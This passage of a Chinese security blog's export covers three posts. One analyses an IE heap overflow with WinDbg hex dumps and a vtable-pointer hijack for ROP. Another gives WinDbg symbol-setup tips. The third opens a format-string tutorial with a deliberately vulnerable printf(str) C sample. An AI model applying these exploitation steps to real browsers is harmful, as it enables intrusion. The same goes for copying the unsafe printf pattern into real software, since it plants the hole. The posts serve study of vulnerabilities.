 ....E.E.A.E.H...</span><br><span class="line">03f2b300  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b310  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b320  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b330  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b340  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b350  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b360  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b370  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b380  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2b390  5b 10 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  [........a......</span><br><span class="line">03f2b3a0  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b3b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b400  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b410  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b420  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b430  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b440  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b450  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b460  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b470  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b480  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b490  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b4a0  41 00 41 00 41 00 00 00-bc 10 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2b4b0  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b4c0  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b4d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b4e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b4f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b500  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b510  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b520  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b530  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b540  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b550  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b560  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b570  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b580  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b590  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b5a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b5b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2b5c0  91 10 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  .........j......</span><br><span class="line">03f2b5d0  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2b5e0  e0 90 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  .....&lt;.h........</span><br><span class="line">03f2b5f0  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b600  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2b610  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b620  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2b630  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b640  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b650  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b660  00 00 00 00 00 00 00 00-00 00 00 00 88 b6 f2 03  ................</span><br><span class="line">03f2b670  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b680  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b690  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6a0  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2b6b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6d0  00 00 00 00 00 00 00 00-f2 10 d1 01 00 00 00 c2  ................</span><br><span class="line">03f2b6e0  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2b6f0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b700  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b710  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b720  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b730  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b740  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b750  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b760  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b770  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b780  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b790  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b7a0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b7b0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b7c0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b7d0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b7e0  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2b7f0  d7 10 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2b800  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b810  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b820  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b830  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b840  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b850  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b860  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b870  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b880  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b890  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8a0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b900  41 00 41 00 41 00 00 00-08 11 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2b910  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b920  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b930  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b940  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b950  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b960  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b970  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b980  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b990  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2ba00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2ba10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2ba20  6d 11 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  m........j......</span><br><span class="line">03f2ba30  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2ba40  50 91 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  P....&lt;.h........</span><br><span class="line">03f2ba50  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2ba60  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2ba70  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2ba80  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2ba90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2baa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bab0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bac0  00 00 00 00 00 00 00 00-00 00 00 00 e8 ba f2 03  ................</span><br><span class="line">03f2bad0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bae0  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2baf0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb00  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2bb10  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb20  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb30  00 00 00 00 00 00 00 00-4e 11 d1 01 00 00 00 c2  ........N.......</span><br><span class="line">03f2bb40  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2bb50  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb60  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2bb70  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2bb80  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2bb90  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2bba0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2bbb0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2bbc0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bbd0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2bbe0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2bbf0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2bc00  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2bc10  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2bc20  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2bc30  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bc40  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2bc50  a3 11 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2bc60  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2bc70  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bc80  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bc90  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bca0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcb0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcc0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcd0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bce0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcf0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd00  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd10  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd20  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd30  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd40  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd50  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd60  41 00 41 00 41 00 00 00-84 11 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2bd70  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2bd80  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2bd90  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bda0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdb0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdc0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdd0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bde0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdf0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be20  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be30  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be40  42 00 42 00 42 00 42 00-42 00 42 00              B.B.B.B.B.B.</span><br></pre></td></tr></table></figure></p><p>很简单的能观察到03f2ae30的AAAA字符串被大量覆盖，所以它就是vulheap。<br>为做对比，我多打印了很多，下面的未被覆盖的AAAA都是成片出现的。</p><p><strong>不过对比漏洞战争书上，本来03f2b040地址处的fa被覆盖为48 00 01 00即0x00010048,这个覆盖看的出来（下图蓝色框线）.<br>按照0x03f2ae30+0x100(EEEE…)+0x8(堆指针大小）+0x100（AAAA…)+0x8(堆指针大小)=03f2b040,也确实应该是这里，我应该没理解错。</strong></p><p><strong>但是很奇怪，我的fa也还在……（下图红色框线），这可能就是我之前弹窗打印出的虚表地址不正确的原因吧，感觉别人的文章里都不会这样……难以理解</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-17-182936.png" alt=""></p><p>得到虚表地址后，计算mshtml基地址，构造rop。</p><p>然后再次溢出，这次溢出直接像刚刚覆盖BBBB的大小一样，直接覆盖虚表指针，于是就可以劫持虚表指针到任意地址，如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(6cc.7f8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=07070024---&gt;控制虚表指针 ebx=01000000 ecx=040f8910 edx=00000041 esi=0375f530 edi=040e0790</span><br><span class="line">eip=003d006b esp=0375f368 ebp=0375f3a0 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">003d006b 777a            ja      003d00e7                                [br=1]</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调试poc的时候还是比较顺利的，在调exp那里各种卡壳，唉。<br>主要还是学到了一些windbg的使用吧。<br>比如如果要下断点，其实可以在html里插入数学函数，比如用Math.cos，然后在jscript!Cos下断。<br>比如要查看jscript的导出表，可以在windbg里用x jscript!* 来查找，找虚表可以使用类似的方法（见上文）</p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> 漏洞战争 </tag>
            
            <tag> IE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windbg使用</title>
      <link href="/2018/03/10/windbg/"/>
      <url>/2018/03/10/windbg/</url>
      <content type="html"><![CDATA[<p>记录一下windbg的使用。<br>1.字体<br><a href="https://bbs.pediy.com/thread-190640.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-190640.htm</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-064654.jpg" alt=""><br>2.!heap不能使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap</span><br><span class="line">*************************************************************************</span><br><span class="line">***                                                                   ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    Either you specified an unqualified symbol, or your debugger   ***</span><br><span class="line">***    doesn&apos;t have full symbol information.  Unqualified symbol      ***</span><br><span class="line">***    resolution is turned off by default. Please either specify a   ***</span><br><span class="line">***    fully qualified symbol module!symbolname, or enable resolution ***</span><br><span class="line">***    of unqualified symbols by typing &quot;.symopt- 100&quot;. Note that   ***</span><br><span class="line">***    enabling unqualified symbol resolution with network symbol     ***</span><br><span class="line">***    server shares in the symbol path may cause the debugger to     ***</span><br><span class="line">***    appear to hang for long periods of time when an incorrect      ***</span><br><span class="line">***    symbol name is typed or the network symbol server is down.     ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    For some commands to work properly, your symbol path           ***</span><br><span class="line">***    must point to .pdb files that have full type information.      ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    Certain .pdb files (such as the public OS symbols) do not      ***</span><br><span class="line">***    contain the required information.  Contact the group that      ***</span><br><span class="line">***    provided you with these symbols if you need this command to    ***</span><br><span class="line">***    work.                                                          ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    Type referenced: ntdll!_HEAP_ENTRY                             ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">*************************************************************************</span><br><span class="line">Invalid type information</span><br></pre></td></tr></table></figure></p><p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.symfix</span><br><span class="line">.reload</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap</span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   00270000                </span><br><span class="line">  2:   015e0000                </span><br><span class="line">  3:   00010000                </span><br><span class="line">  4:   00020000</span><br></pre></td></tr></table></figure><p>3.没有符号文件<br>在windbg的窗口里输入<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>格式化字符串漏洞原理及湖湘杯pwn200 writeup</title>
      <link href="/2018/03/05/pwn_fmtstr/"/>
      <url>/2018/03/05/pwn_fmtstr/</url>
      <content type="html"><![CDATA[<h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>pwn题中，有形如下述代码的形式就是格式化字符串漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure></p><p>也许使用者的目的只是直接输出字符串，但是这段字符串来源于可控的输入，就造成了漏洞。<br>示例程序如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(str)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译：<code>gcc -m32 -o str str.c</code><br>输入：<code>%2$x</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142756.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142805.jpg" alt=""><br>原因是如果直接printf(“占位符”)这种形式，就会把栈上的偏移当做数据输出出来。通过构造格式化串，就可以实现任意地址读和任意地址写。</p><h3 id="任意地址读"><a href="#任意地址读" class="headerlink" 